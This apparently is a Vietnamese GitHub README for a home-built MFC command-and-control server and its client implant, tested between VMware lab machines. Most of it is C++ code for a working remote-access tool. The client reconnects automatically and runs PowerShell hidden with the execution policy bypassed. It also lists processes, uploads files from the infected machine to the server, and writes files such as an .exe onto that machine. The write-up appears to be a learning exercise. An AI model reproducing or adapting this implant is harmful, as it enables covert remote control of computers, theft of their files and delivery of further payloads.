# MFC C&C Server

```
Code server C&C sử dụng MFC
Yêu cầu: Có khả năng thực thi các command, liệt kê process, tải file, upload file
Xử lý đa luồng
```

---

## Khởi tạo kết nối

### Server

**1. Khởi tạo Winsock**

```cpp
WSAStartup(MAKEWORD(2, 2), &wsaData)
```

Khởi tạo thư viện Winsock 2.2, bắt buộc phải gọi trước mọi socket API. `wsaData` nhận thông tin phiên bản được cấp.

---

**2. Tạo socket lắng nghe**

```cpp
socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
```

| Tham số | Ý nghĩa |
|---|---|
| `AF_INET` | IPv4 |
| `SOCK_STREAM` | TCP (có kết nối, đảm bảo thứ tự) |
| `IPPROTO_TCP` | Giao thức TCP |

---

**3. Bind địa chỉ**

```cpp
address.sin_family = AF_INET;
address.sin_port   = htons(5050);
InetPton(AF_INET, _T("192.168.111.1"), &address.sin_addr);

bind(listenSocket, reinterpret_cast<sockaddr*>(&address), sizeof(address));
```

- `htons()` — chuyển port từ host byte order sang network byte order (big-endian).
- `InetPton()` — chuyển chuỗi IP thành dạng nhị phân 32-bit.
- IP `192.168.111.1` là địa chỉ của `VMware Network Adapter VMnet8` (host side), tức là server lắng nghe trên adapter ảo VMware NAT — chỉ nhận kết nối từ VM guest qua NAT.

---

**4. Listen**

```cpp
listen(listenSocket, SOMAXCONN)
```

Đưa socket vào trạng thái chờ kết nối. `SOMAXCONN` cho phép hệ thống tự chọn backlog queue tối đa.

---

**5. Non-blocking mode cho listen socket**

```cpp
u_long nonBlocking = 1;
ioctlsocket(listenSocket, FIONBIO, &nonBlocking);
```

`ioctlsocket` với `FIONBIO = 1` chuyển socket sang **non-blocking**: `accept()` sẽ trả về ngay lập tức thay vì block. Cho phép vòng lặp accept kết hợp với `WaitForSingleObject` để kiểm tra tín hiệu dừng server.

---

**6. Accept loop**

```cpp
while (WaitForSingleObject(pDlg->m_stopEvent, 50) == WAIT_TIMEOUT)
{
    SOCKET clientSocket = accept(listenSocket, ...);
    if (clientSocket == INVALID_SOCKET)
    {
        if (WSAGetLastError() == WSAEWOULDBLOCK) continue;
        break;
    }
    // Spawn thread xử lý client
}
```

- `WaitForSingleObject(m_stopEvent, 50)` — chờ event dừng trong 50ms. Nếu chưa có tín hiệu (`WAIT_TIMEOUT`) thì tiếp tục vòng lặp.
- `accept()` trong non-blocking mode: nếu chưa có client đến → trả `WSAEWOULDBLOCK` → `continue`. Nếu có client → trả socket mới.
- Mỗi client được xử lý bởi **một thread riêng**.

---

**7. Chuyển client socket về blocking**

```cpp
u_long clientBlocking = 0;
ioctlsocket(clientSocket, FIONBIO, &clientBlocking);
```

Socket của từng client được đặt lại về **blocking mode** (`FIONBIO = 0`) để client thread có thể dùng `RecvExact()` (blocking read) — đơn giản hóa logic đọc dữ liệu trong thread riêng.

---

**8. Spawn worker thread cho mỗi client**

```cpp
AfxBeginThread(ClientSessionThreadProc, new ClientSessionPayload{ pDlg, clientSocket, remoteAddress });
```

`AfxBeginThread` là hàm MFC tạo `CWinThread`. Truyền vào con trỏ `ClientSessionPayload` (heap-allocated) chứa:
- `pDlg` — pointer đến dialog chính (để post message lên UI thread)
- `socket` — socket handle của client
- `remoteAddress` — chuỗi `IP:port` của client

---

### Client

**1. Reconnect loop**

```cpp
while (true)
{
    SOCKET socketHandle = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (connect(socketHandle, ...) == SOCKET_ERROR)
    {
        closesocket(socketHandle);
        Sleep(1000);
        continue;
    }
    // Kết nối thành công
}
```

Client chạy vòng lặp vô hạn, nếu `connect()` thất bại thì `Sleep(1000)` rồi thử lại — đảm bảo tự reconnect sau khi server khởi động lại.

---

**2. Gửi HELLO sau khi kết nối**

```cpp
std::string helloUtf8 = Utf8FromWide(clientId);
SendFrame(socketHandle, FrameType::HELLO, 0, helloUtf8.data(), helloUtf8.size());
```

`clientId` là hostname lấy từ `GetComputerNameW()`. Được encode sang UTF-8 trước khi gửi.

---

### Handshake HELLO

```
Client → Server: Frame(HELLO, requestId=0, payload=<hostname UTF-8>)
Server → đọc HELLO, lưu clientId
```

Server dùng `RecvFrame()` đọc frame đầu tiên, kiểm tra `hello.type == FrameType::HELLO`. Nếu không đúng hoặc timeout → đóng kết nối ngay. `clientId` từ payload được dùng để định danh client trong toàn bộ session.

---

## Frame Protocol

### Cấu trúc frame (binary)

```
┌──────────────────┬───────────┬─────────────┬───────────┐
│ payloadLen (4B)  │ type (2B) │requestId(4B)│payload(NB)│
└──────────────────┴───────────┴─────────────┴───────────┘
```

| Field | Size | Mô tả |
|---|---|---|
| `payloadLen` | 4 bytes, little-endian | Kích thước payload |
| `type` | 2 bytes | Loại frame (`FrameType` enum) |
| `requestId` | 4 bytes | ID request (dùng để ghép response) |
| `payload` | N bytes | Dữ liệu thực tế |

---

### SendFrame

```cpp
bool SendFrame(SOCKET socketHandle, FrameType type, unsigned int requestId,
               const void* payload, unsigned int payloadLen)
{
    SendAll(socketHandle, &payloadLen, sizeof(payloadLen)); // 4 bytes
    SendAll(socketHandle, &typeValue,  sizeof(typeValue));  // 2 bytes
    SendAll(socketHandle, &requestId,  sizeof(requestId));  // 4 bytes
    if (payloadLen > 0)
        SendAll(socketHandle, payload, payloadLen);         // N bytes
}
```

`SendAll()` gọi `send()` trong loop để đảm bảo toàn bộ dữ liệu được gửi (vì TCP có thể gửi từng phần).

---

### RecvFrame

```cpp
bool RecvFrame(SOCKET socketHandle, Frame& outFrame)
{
    RecvExact(socketHandle, &payloadLen, 4);  // đọc đúng 4 byte
    RecvExact(socketHandle, &type,       2);  // đọc đúng 2 byte
    RecvExact(socketHandle, &requestId,  4);  // đọc đúng 4 byte
    outFrame.payload.resize(payloadLen);
    RecvExact(socketHandle, outFrame.payload.data(), payloadLen);
}
```

`RecvExact()` gọi `recv()` trong loop đến khi đủ `size` byte — cần thiết vì TCP có thể chia nhỏ dữ liệu.

---

## Xử lý đa luồng

### Kiến trúc thread

```
Main/UI Thread (CServerDlg)
├── ServerThreadProc         ← 1 thread listen & accept
│   └── ClientSessionThreadProc  ← 1 thread/client
│       └── PostMessage(WM_APP_WORKER_LOG) → UI Thread
```

### Giao tiếp thread → UI: PostMessage

```cpp
auto event = std::make_unique<ServerEvent>();
event->logLine = _T("...");
pDlg->PostMessage(WM_APP_WORKER_LOG, 0, reinterpret_cast<LPARAM>(event.release()));
```

### Client count

```cpp
LONG IncrementActiveClientCount() { return InterlockedIncrement(&m_activeClientCount); }
LONG DecrementActiveClientCount() { return InterlockedDecrement(&m_activeClientCount); }
```

---

## Luồng xử lý sau khi kết nối

### Server — ClientSessionThreadProc

```cpp
while (WaitForSingleObject(pDlg->m_stopEvent, 10) == WAIT_TIMEOUT)
{
    Frame frame = {};
    if (!RecvFrame(payload->socket, frame)) break;  // client ngắt

    switch (frame.type)
    {
    case EXEC_RESP:     // nhận kết quả PowerShell
    case LIST_PROC_RESP: // nhận danh sách process
    case GET_FILE_RESP:  // nhận nội dung file
    case PUT_FILE_RESP:  // nhận xác nhận ghi file
    case ERROR_RESP:     // nhận lỗi từ client
    }
    PostMessage(WM_APP_WORKER_LOG, ...)
}
```

Server **nhận response** từ client và hiển thị lên GUI.

### Client — vòng lặp chính

```cpp
while (true)
{
    Frame frame = {};
    if (!RecvFrame(socketHandle, frame)) break;  // server ngắt

    switch (frame.type)
    {
    case EXEC_REQ:      // thực thi lệnh PowerShell
    case LIST_PROC_REQ: // liệt kê process
    case GET_FILE_REQ:  // đọc file gửi về server
    case PUT_FILE_REQ:  // nhận file ghi ra disk
    }
}
closesocket(socketHandle);
Sleep(1000); // reconnect
```

Client **thực thi yêu cầu** từ server, gửi kết quả ngược lại.

---

## Flow chi tiết từng loại packet

### 1. EXEC — Thực thi lệnh PowerShell

```
Server ──[EXEC_REQ(cmd)]──────────────────→ Client
                                              ↓ ExecCommandCapture()
Server ←──[EXEC_RESP(output)]────────────── Client
```

**Server gửi:**

```cpp
// OnBnClickedExec() — triggered khi click nút EXEC trên GUI
std::string cmdUtf8 = Utf8FromCString(m_messageText);
SendFrame(clientSocket, FrameType::EXEC_REQ, requestId, cmdUtf8.data(), cmdUtf8.size());
```

**Client thực thi — `ExecCommandCapture()`:**

```cpp
std::wstring cmdLine = L"powershell.exe -NoProfile -NonInteractive "
                       L"-ExecutionPolicy Bypass -Command " + command;

HANDLE readPipe, writePipe;
CreatePipe(&readPipe, &writePipe, &sa, 0);       // tạo anonymous pipe

CreateProcessW(nullptr, &cmdLine[0], ...,
    STARTF_USESTDHANDLES,
    hStdOutput = writePipe,                       // redirect stdout
    hStdError  = writePipe);                      // redirect stderr

// đọc output qua pipe
while (ReadFile(readPipe, tmp, sizeof(tmp), &read, nullptr) && read > 0)
    buffer.append(tmp, tmp + read);

WaitForSingleObject(pi.hProcess, 5000);          // chờ tối đa 5 giây
```

Win API sử dụng:
- `CreatePipe()` — tạo anonymous pipe để capture stdout/stderr
- `SetHandleInformation()` — tắt `HANDLE_FLAG_INHERIT` cho read end để không bị child process kế thừa
- `CreateProcessW()` với `STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW` và `SW_HIDE` — spawn PowerShell ẩn, redirect output vào pipe
- `ReadFile()` — đọc output từ pipe
- `WaitForSingleObject(hProcess, 5000)` — chờ process kết thúc (timeout 5s)

**Client gửi trả:**

```cpp
std::string outUtf8 = Utf8FromWide(out);
SendFrame(socketHandle, FrameType::EXEC_RESP, frame.requestId, outUtf8.data(), outUtf8.size());
```

**Server hiển thị:** output được cập nhật vào `m_execOutput` → hiển thị ở ô *EXEC Output* trong GUI.

---

### 2. LIST_PROC — Liệt kê process

```
Server ──[LIST_PROC_REQ]──────────────────→ Client
                                              ↓ EnumerateProcesses()
Server ←──[LIST_PROC_RESP(list)]──────────── Client
```

**Client — `EnumerateProcesses()`:**

```cpp
HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

PROCESSENTRY32 entry = {};
entry.dwSize = sizeof(entry);
if (Process32First(snapshot, &entry))
{
    do {
        lines += std::to_wstring(entry.th32ProcessID) + L" " + entry.szExeFile + L"\n";
    } while (Process32Next(snapshot, &entry));
}
CloseHandle(snapshot);
```

Win API sử dụng:
- `CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)` — tạo snapshot toàn bộ process đang chạy
- `Process32First()` / `Process32Next()` — duyệt từng `PROCESSENTRY32` trong snapshot
- Mỗi entry có `th32ProcessID` (PID) và `szExeFile` (tên file EXE)

**Server hiển thị:** danh sách được populate vào `m_processList` (ListBox) qua `ReplaceProcessList()`.

---

### 3. GET_FILE — Lấy file từ client về server

```
Server ──[GET_FILE_REQ(remote_path)]──────→ Client
                                              ↓ đọc file
Server ←──[GET_FILE_RESP([status][size][data])]── Client
         ↓ ghi ra file local
```

**Server gửi:**

```cpp
// OnBnClickedGetFile()
// m_messageText = đường dẫn file trên client (nhập từ ô command)
// saveDlg.GetPathName() = đường dẫn lưu trên server (chọn qua SaveFileDialog)

unsigned int requestId = InterlockedIncrement(&m_nextRequestId);
m_pendingDownloadSavePath[requestId] = savePath;  // lưu save path theo requestId

std::string pathUtf8 = Utf8FromCString(remotePath);
SendFrame(clientSocket, FrameType::GET_FILE_REQ, requestId, pathUtf8.data(), pathUtf8.size());
```

**Client đọc file:**

```cpp
std::wstring path = WideFromUtf8(std::string(frame.payload.begin(), frame.payload.end()));
HANDLE fileHandle = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ,
                                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);

GetFileSizeEx(fileHandle, &size);  // kiểm tra kích thước (max 50MB)

// đọc file theo chunk 64KB
while (offset < bytes.size())
    ReadFile(fileHandle, bytes.data() + offset, chunk, &read, nullptr);
```

**Client gửi response — payload format:**

```
[status: 4B][fileSize: 8B][data: N bytes]
```

**Server nhận và ghi file (`GET_FILE_RESP` handler):**

```cpp
// lấy save path theo requestId từ m_pendingDownloadSavePath
memcpy(&status,   frame.payload.data(),                  sizeof(status));
memcpy(&size,     frame.payload.data() + sizeof(status), sizeof(size));

HANDLE outFile = CreateFile(savePath, GENERIC_WRITE, 0, nullptr,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
WriteFile(outFile, data, chunk, &written, nullptr);
```

Win API sử dụng: `CreateFileW`, `GetFileSizeEx`, `ReadFile`, `WriteFile`, `CloseHandle`.

---

### 4. PUT_FILE — Đẩy file từ server lên client

```
Server ──[PUT_FILE_REQ([pathLen][path][fileSize][data])]──→ Client
                                                              ↓ ghi file
Server ←──[PUT_FILE_RESP("OK PUT_FILE saved")]────────────── Client
```

**Server đọc file local và đóng gói payload:**

```cpp
// OnBnClickedPutFile()
// m_messageText = đường dẫn thư mục đích trên client (nhập từ ô command)
// openDlg.GetPathName() = file local cần gửi (chọn qua OpenFileDialog)

// Ghép finalRemotePath = remoteDestPath + "\" + fileName
// Payload layout:
//   [pathLen: 4B][path UTF-8: N bytes][fileSize: 8B][data: M bytes]

memcpy(payload.data() + pos, &pathLen, sizeof(pathLen));
memcpy(payload.data() + pos, pathUtf8.data(), pathLen);
memcpy(payload.data() + pos, &fileSize, sizeof(fileSize));
memcpy(payload.data() + pos, bytes.data(), bytes.size());

SendFrame(clientSocket, FrameType::PUT_FILE_REQ, requestId, payload.data(), payload.size());
```

**Client phân tích payload và ghi file:**

```cpp
// đọc pathLen, path, fileSize từ frame.payload
std::wstring path = WideFromUtf8(pathUtf8);

HANDLE outFile = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
                             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
while (remaining > 0)
    WriteFile(outFile, data + offset, chunk, &written, nullptr);

CloseHandle(outFile);
SendFrame(socketHandle, FrameType::PUT_FILE_RESP, frame.requestId, "OK PUT_FILE saved", ...);
```

`CREATE_ALWAYS` — tạo file mới, ghi đè nếu đã tồn tại.

---

## Encode/Decode chuỗi

Toàn bộ chuỗi truyền qua mạng đều được encode sang **UTF-8**:

```cpp
// Wide → UTF-8 (trước khi gửi)
int count = WideCharToMultiByte(CP_UTF8, 0, value, -1, nullptr, 0, nullptr, nullptr);
WideCharToMultiByte(CP_UTF8, 0, value, -1, &result[0], count - 1, nullptr, nullptr);

// UTF-8 → Wide (sau khi nhận)
int count = MultiByteToWideChar(CP_UTF8, 0, bytes.data(), bytes.size(), nullptr, 0);
MultiByteToWideChar(CP_UTF8, 0, bytes.data(), bytes.size(), &result[0], count);
```

MFC dùng `CString` (UNICODE build → `wchar_t`), nên cần convert 2 chiều mỗi khi đọc/ghi dữ liệu qua socket.

---

## Thực nghiệm  
Chạy 2 client trên 2 máy khác nhau để kiểm tra xử lý đa luồng:

<img width="1157" height="637" alt="image" src="https://github.com/user-attachments/assets/a49546fb-621c-4bd4-8745-b733363528ed" />

<img width="1903" height="972" alt="image" src="https://github.com/user-attachments/assets/4516101a-e519-4938-afcf-35efbe41b6e3" />

chạy server:

<img width="913" height="637" alt="image" src="https://github.com/user-attachments/assets/ccbc9305-ec83-4a5f-9b80-ccbcbcf9767f" />

ta thấy server đã hiện 2 client, để đổi view client nào thì ta click vào client đó.

thử list process bằng nút `LIST_PROC`:

<img width="898" height="632" alt="image" src="https://github.com/user-attachments/assets/1967022d-d60c-4005-a3ec-d36f787cb348" />

<img width="901" height="620" alt="image" src="https://github.com/user-attachments/assets/1f4e1da7-7697-472b-adf7-da0ab6e24ed3" />

thử exec command powershell là `dir` bằng nút `EXEC`:

<img width="906" height="627" alt="image" src="https://github.com/user-attachments/assets/ae0e8a6b-e16f-4c6f-8da0-ce3c4af9d938" />

<img width="910" height="632" alt="image" src="https://github.com/user-attachments/assets/a678adce-45c1-452d-930b-f85f2eaba95f" />

Ta lấy file `C:\Users\Admin\Videos\script.py` từ client bằng nút GET_FILE:

<img width="902" height="627" alt="image" src="https://github.com/user-attachments/assets/7f6fedd0-ded9-4eb7-b453-70cdbe7abf6e" />

Ghi vào thư mục `Music` trên server với tên là `hihi.py`

<img width="932" height="573" alt="image" src="https://github.com/user-attachments/assets/ed7b9fc0-eeee-46e0-82ba-c6aadcb04de4" />

Ta thấy đã lưu vào server thành công:

<img width="1852" height="782" alt="image" src="https://github.com/user-attachments/assets/b426c1c6-5d16-4b7d-b7b8-d3b8c5331e78" />

Tiếp tục ta ghi file từ server vào path `C:\Users\Admin\Videos` ở client bằng nút PUT_FILE

<img width="905" height="636" alt="image" src="https://github.com/user-attachments/assets/db744c68-e558-4378-b2e1-9fb2aa96fe62" />

Chọn file `testlmao.exe` từ server để PUT vào client:

<img width="932" height="586" alt="image" src="https://github.com/user-attachments/assets/9c7bf7f1-e0a4-4672-ab33-aa2b5c36c9a3" />

Client đã có thêm file `testlmao.exe`:

<img width="1918" height="912" alt="image" src="https://github.com/user-attachments/assets/08df7e75-e3d6-4d49-a5cb-4a5d603e04e7" />


